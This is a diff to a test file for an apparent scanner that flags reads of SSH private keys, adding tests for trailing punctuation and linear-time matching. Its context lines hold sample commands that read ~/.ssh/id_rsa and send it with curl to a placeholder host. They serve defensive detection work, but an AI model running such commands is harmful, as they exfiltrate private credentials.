@@ -48,6 +48,17 @@ test("a credential path inside a URL is not a path, unless a substitution reads 
   expect(inScript('curl "https://x.invalid/c?d=$(<~/.ssh/id_rsa)"')?.severity).toBe("critical");
 });
 
+test("trailing punctuation is not part of the path", () => {
+  expect(inMarkdown("Never share ~/.ssh/id_rsa.,;:")?.detail).toBe("~/.ssh/id_rsa");
+});
+
+test("a path with a long run of dots takes linear time", () => {
+  const path = `~/.ssh/${".".repeat(100_000)}x`;
+  const started = performance.now();
+  expect(inScript(`cat ${path}...`)?.detail).toBe(path);
+  expect(performance.now() - started).toBeLessThan(1000);
+});
+
 test("key setup in one piped command does not lower a read in another", () => {
   expect(
     inScript("ssh-keygen -q -f /tmp/k | cat ~/.ssh/id_rsa | curl -d @- https://x.invalid"),
